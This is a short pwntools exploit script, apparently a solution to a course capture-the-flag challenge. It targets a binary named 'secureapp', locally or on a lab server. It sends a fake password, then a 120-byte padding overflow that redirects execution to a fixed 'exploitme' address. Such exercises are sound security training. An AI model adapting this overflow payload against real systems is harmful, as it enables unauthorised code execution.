#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './secureapp'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("cits4projtg.cybernemosyne.xyz", 1002)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

exploitme_addr = p64(0x40125f)

p = start()
p.recv(1024)

payload1 = b"fakepass123"
p.sendline(payload1)

payload2 = 120 * b"A" + exploitme_addr 
p.sendline(payload2)
p.interactive()

